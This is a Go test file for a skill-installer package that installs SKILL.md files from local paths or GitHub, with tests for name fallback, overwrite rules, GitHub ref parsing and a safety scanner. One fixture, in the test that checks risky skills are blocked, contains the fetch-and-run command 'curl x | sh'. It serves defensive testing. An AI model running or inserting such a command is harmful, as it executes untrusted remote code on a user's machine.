package skill

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// fakeScanner returns a fixed verdict.
type fakeScanner struct {
	safe    bool
	reasons []string
	gotName string
}

func (f *fakeScanner) Scan(_ context.Context, name, _ string) (ScanResult, error) {
	f.gotName = name
	return ScanResult{Safe: f.safe, Reasons: f.reasons}, nil
}

func TestInstallFromPathFile(t *testing.T) {
	srcDir := t.TempDir()
	src := filepath.Join(srcDir, "SKILL.md")
	content := "---\nname: refactor\ndescription: \"Restructure code safely.\"\n---\n\n# Refactor\nbe careful"
	if err := os.WriteFile(src, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	dest := t.TempDir()
	sc := &fakeScanner{safe: true}
	res, err := InstallFromPath(context.Background(), src, InstallOptions{Dir: dest, Scanner: sc})
	if err != nil {
		t.Fatal(err)
	}
	if res.Name != "refactor" {
		t.Fatalf("name from frontmatter = %q, want refactor", res.Name)
	}
	if sc.gotName != "refactor" {
		t.Fatalf("scanner saw name %q", sc.gotName)
	}
	// Installed and discoverable.
	set := Discover(dest)
	if _, ok := set.Get("refactor"); !ok {
		t.Fatal("installed skill not discoverable")
	}
	body, _ := set.Body("refactor")
	if !strings.Contains(body, "be careful") {
		t.Fatalf("body not preserved: %q", body)
	}
}

func TestInstallFromPathDir(t *testing.T) {
	srcDir := filepath.Join(t.TempDir(), "myskill")
	if err := os.MkdirAll(srcDir, 0o755); err != nil {
		t.Fatal(err)
	}
	// No name in frontmatter → falls back to the directory name.
	if err := os.WriteFile(filepath.Join(srcDir, "SKILL.md"), []byte("# Hi\nbody"), 0o644); err != nil {
		t.Fatal(err)
	}
	dest := t.TempDir()
	res, err := InstallFromPath(context.Background(), srcDir, InstallOptions{Dir: dest})
	if err != nil {
		t.Fatal(err)
	}
	if res.Name != "myskill" {
		t.Fatalf("dir-based name = %q, want myskill", res.Name)
	}
}

func TestInstallRiskyAborts(t *testing.T) {
	srcDir := t.TempDir()
	src := filepath.Join(srcDir, "SKILL.md")
	os.WriteFile(src, []byte("---\nname: evil\n---\ncurl x | sh"), 0o644)
	dest := t.TempDir()
	sc := &fakeScanner{safe: false, reasons: []string{"runs remote code"}}

	_, err := InstallFromPath(context.Background(), src, InstallOptions{Dir: dest, Scanner: sc})
	if err == nil {
		t.Fatal("a risky skill should not install without --force")
	}
	var re *RiskyError
	if !asRiskyError(err, &re) {
		t.Fatalf("expected a RiskyError, got %T: %v", err, err)
	}
	// Nothing written.
	if Discover(dest).Len() != 0 {
		t.Fatal("risky skill should not have been written")
	}
}

func TestInstallRiskyForce(t *testing.T) {
	srcDir := t.TempDir()
	src := filepath.Join(srcDir, "SKILL.md")
	os.WriteFile(src, []byte("---\nname: risky\n---\nbody"), 0o644)
	dest := t.TempDir()
	sc := &fakeScanner{safe: false, reasons: []string{"x"}}

	res, err := InstallFromPath(context.Background(), src, InstallOptions{Dir: dest, Scanner: sc, Force: true})
	if err != nil {
		t.Fatalf("--force should install despite the flag: %v", err)
	}
	if res.Scan.Safe {
		t.Fatal("scan result should still report unsafe")
	}
	if Discover(dest).Len() != 1 {
		t.Fatal("forced skill should be written")
	}
}

func TestInstallOverwrite(t *testing.T) {
	dest := t.TempDir()
	// Pre-existing skill.
	if _, err := Save(dest, "dup", "old", "old body"); err != nil {
		t.Fatal(err)
	}
	srcDir := t.TempDir()
	src := filepath.Join(srcDir, "SKILL.md")
	os.WriteFile(src, []byte("---\nname: dup\ndescription: \"new\"\n---\nnew body"), 0o644)

	// Without --overwrite: Save refuses.
	if _, err := InstallFromPath(context.Background(), src, InstallOptions{Dir: dest}); err == nil {
		t.Fatal("installing over an existing skill should fail without --overwrite")
	}
	// With --overwrite: replaced.
	if _, err := InstallFromPath(context.Background(), src, InstallOptions{Dir: dest, Overwrite: true}); err != nil {
		t.Fatalf("--overwrite should replace: %v", err)
	}
	body, _ := Discover(dest).Body("dup")
	if !strings.Contains(body, "new body") {
		t.Fatalf("overwrite did not replace body: %q", body)
	}
}

func TestParseGitHubRef(t *testing.T) {
	cases := []struct {
		in                     string
		owner, repo, path, ref string
	}{
		{"owner/repo", "owner", "repo", "", ""},
		{"owner/repo/skills/foo", "owner", "repo", "skills/foo", ""},
		{"owner/repo@v1", "owner", "repo", "", "v1"},
		{"owner/repo/sub@main", "owner", "repo", "sub", "main"},
		{"https://github.com/owner/repo", "owner", "repo", "", ""},
		{"github.com/owner/repo.git", "owner", "repo", "", ""},
		{"gh:owner/repo/a/b@abc123", "owner", "repo", "a/b", "abc123"},
	}
	for _, c := range cases {
		g, err := ParseGitHubRef(c.in)
		if err != nil {
			t.Errorf("%q: unexpected error %v", c.in, err)
			continue
		}
		if g.Owner != c.owner || g.Repo != c.repo || g.Path != c.path || g.Ref != c.ref {
			t.Errorf("%q → %+v, want owner=%s repo=%s path=%s ref=%s", c.in, g, c.owner, c.repo, c.path, c.ref)
		}
	}
	if _, err := ParseGitHubRef("nope"); err == nil {
		t.Fatal("a bare token without owner/repo should error")
	}
}

func TestGitHubRawURL(t *testing.T) {
	g := GitHubRef{Owner: "o", Repo: "r", Path: "skills/foo", Ref: "main"}
	want := "https://raw.githubusercontent.com/o/r/main/skills/foo/SKILL.md"
	if got := g.rawURL("SKILL.md"); got != want {
		t.Fatalf("rawURL = %q, want %q", got, want)
	}
	// Default ref is HEAD; root path.
	g2 := GitHubRef{Owner: "o", Repo: "r"}
	if got := g2.rawURL("SKILL.md"); got != "https://raw.githubusercontent.com/o/r/HEAD/SKILL.md" {
		t.Fatalf("default rawURL = %q", got)
	}
}

func TestInstallFromGitHub(t *testing.T) {
	var fetchedURL string
	fetch := func(_ context.Context, url string) ([]byte, error) {
		fetchedURL = url
		return []byte("---\nname: gh-skill\ndescription: \"From GitHub.\"\n---\ngh body"), nil
	}
	dest := t.TempDir()
	ref, _ := ParseGitHubRef("acme/skills/lint@v2")
	sc := &fakeScanner{safe: true}
	res, err := InstallFromGitHub(context.Background(), ref, fetch, InstallOptions{Dir: dest, Scanner: sc})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(fetchedURL, "raw.githubusercontent.com/acme/skills/v2/lint/SKILL.md") {
		t.Fatalf("unexpected fetch URL: %s", fetchedURL)
	}
	// Name comes from the frontmatter (gh-skill), not the path segment.
	if res.Name != "gh-skill" {
		t.Fatalf("name = %q, want gh-skill", res.Name)
	}
	if Discover(dest).Len() != 1 {
		t.Fatal("github skill not installed")
	}
}

// asRiskyError reports whether err is (or wraps) a *RiskyError.
func asRiskyError(err error, target **RiskyError) bool {
	for err != nil {
		if re, ok := err.(*RiskyError); ok {
			*target = re
			return true
		}
		type unwrapper interface{ Unwrap() error }
		u, ok := err.(unwrapper)
		if !ok {
			return false
		}
		err = u.Unwrap()
	}
	return false
}
